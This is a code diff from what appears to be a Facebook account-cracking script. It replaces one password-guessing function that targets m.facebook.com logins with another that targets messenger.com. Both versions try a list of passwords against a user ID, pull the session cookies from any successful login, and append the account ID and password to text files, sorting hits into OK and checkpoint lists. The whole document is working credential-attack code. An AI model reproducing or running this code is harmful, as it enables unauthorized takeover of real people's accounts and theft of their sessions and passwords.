@@ -1394,75 +1394,79 @@ def rndm4(uid,passlist):
 
 
 def rndm5(uid,passlist):
-        global loop
-        global oks
-        sys.stdout.write(f'\r\r{G}[{R}BITHIKA-M4{G}]{G} %s {G}|{G} OK{G}|{G}CP{G} %s{G}|{R}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
-        session=requests.Session()
-        au=Ugen()
-        try:
-                for pas in passlist:
-                        ses = requests.Session()
-                        heas = {"Host": "x.facebook.com",
-				"dnt": "1","upgrade-insecure-requests": "1",
-				"user-agent": au,
-				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"sec-fetch-site": "none",
-				"sec-fetch-mode": "navigate",
-				"sec-fetch-user": "?1",
-				"sec-fetch-dest": "document",
-				"accept-encoding": "gzip, deflate",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",}
-                        link = ses.get("https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8", headers=heas)
-                        gett = sop(link.text, "html.parser")
-                        datax = gett.find("form",{"method":"post"})["action"]
-                        data = {"lsd": re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
-				"jazoest": re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
-				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
-				"li": re.search('name="li" value="(.*?)"', str(link.text)).group(1),
-				"try_number": "0",
-				"unrecognized_tries": "0",
-				"email": uid,
-				"pass": pas,
-				"login": "Masuk",
-				"bi_xrwh": "0"}
-                        cookie = dict(ses.cookies.get_dict())
-                        head = {"Host": " m.facebook.com",
-				"content-length": "160",
-				"cache-control": "max-age=0",
-				"origin": "https://mbasic.facebook.com",
-				"upgrade-insecure-requests": "1",
-				"dnt": "1",
-				"content-type": "application/x-www-form-urlencoded",
-				"user-agent": au,
-				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
-				"sec-fetch-site": "same-origin",
-				"sec-fetch-mode": "navigate",
-				"sec-fetch-user": "?1",
-				"sec-fetch-dest": "document",
-				"referer": "https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8",
-				"accept-encoding": "gzip, deflate",
-				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-                        xnxx = ses.post(f"https://m.facebook.com{datax}", data=data, cookies=cookie, headers=head, allow_redirects=True)
-                        fb_cookies=ses.cookies.get_dict().keys()
-                        if 'c_user' in fb_cookies:
-                                        coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
-                                        uidx = coki[65:80]
-                                        print('\033[1;32m [AZIM-OK] '+uidx+'|'+pas+'|'+coki+'\033[0;97m')
-                                        open('OK.txt', 'a').write(uidx+'|'+pas+'\n')
-                                        oks.append(uidx)
-                                        break
-                        elif 'checkpoint' in fb_cookies:
-                                        coki=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
-                                        uidx = coki[82:97]
-                                        print('\033[1;31m [AZIM-CP] '+uidx+' | '+pas+'\033[0;97m')
-                                        open('CP.txt', 'a').write(uidx+'|'+pas+'\n')
-                                        cps.append(uidx)
-                                        break
-                        else:
-                                        continue
-                loop+=1
-        except:
-                pass
+	global loop,oks,cps
+	sys.stdout.write('\r\r\033[1;37m [HAMZA] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+	ses = requests.Session()
+	while True:
+		try:
+			ua = random.choice(ugen)
+			headers = {
+             "Host": "www.messenger.com",
+             "Connection": "keep-alive",
+             "Content-Length": "267",
+             "Cache-Control": "max-age=0",
+             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
+             "sec-ch-ua-mobile": "?0",
+             "sec-ch-ua-platform": '"Linux"',
+             "Upgrade-Insecure-Requests": "1",
+             "Origin": "https://www.messenger.com",
+             "Content-Type": "application/x-www-form-urlencoded",
+             "User-Agent": ua,
+             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+             "Sec-Fetch-Site": "same-origin",
+             "Sec-Fetch-Mode": "navigate",
+             "Sec-Fetch-User": "?1",
+             "Sec-Fetch-Dest": "document",
+             "Referer": "https://www.messenger.com/",
+             "Accept-Encoding": "gzip, deflate, br",
+             "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
+			}
+			reqs = ses.get("https://www.messenger.com/").text
+			datr = re.search('_js_datr","(.*?)",', str(reqs)).group(1)
+			data = {
+             "jazoest":re.search('name="jazoest" value="(.*?)"', str(reqs)).group(1),
+             "lsd":re.search('name="lsd" value="(.*?)"', str(reqs)).group(1),
+             "initial_request_id":re.search('name="initial_request_id" value="(.*?)"', str(reqs)).group(1),
+             "timezone":"-300",
+             "lgndim":re.search('name="lgndim" value="(.*?)"', str(reqs)).group(1),
+             "lgnrnd":re.search('name="lgnrnd" value="(.*?)"', str(reqs)).group(1),
+             "lgnjs":"n",
+             "email":uid,
+             "login":"1",
+             "default_persistent":""
+			}
+			headers.update({"Cookie":f"wd=980x1715; dpr=2; _js_datr={datr}"})
+			break
+		except Exception as e:pass
+	for pas in passlist:
+		try:
+			data.update({"pass":"".join(pas)})
+			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, proxies=prox(), allow_redirects=False)
+			if "c_user" in ses.cookies.get_dict():
+				coki = ses.cookies.get_dict()
+				cok = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=en_US" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + base64.b64encode(os.urandom(30)).decode().replace("=","").replace("+","_").replace("/","-")) + ";" + ("m_page_voice="+coki["c_user"]) + ";ps_n=0;ps_l=0;m_pixel_ratio=2;wd=360x820;"
+				uid = re.search('user=(.*?);',str(cok)).group(1)
+				if uid in str(oks):
+					break
+				print('\r\r\033[1;32m [HAMZA-OK] '+uid+' | '+pas+'\033[1;37m')
+				oks.append(uid)
+				open('/sdcard/HAMZA-R-OK.txt','a').write(uid+'|'+pas+'\n')
+				break
+			elif "www.facebook.com%2Fcheckpoint" in str(response.headers.get('Location')):
+				try:
+					x = str(response.headers)
+					ids = re.findall("3A(.*?)%2",str(x))[1]
+				except:
+					ids = ids
+				open('/sdcard/HANZA-R-CP.txt','a').write(ids+'|'+pas+'\n')
+				cps.append(ids)
+				break
+			else:continue
+		except (requests.exceptions.ConnectionError):
+			time.sleep(5)
+			Hamza1(ids,passlist)
+		except Exception as e:pass
+	loop+=1
 #----------------[ ID-CHECKER ]--------------------------#
 
 def cek_apk(session, coki):
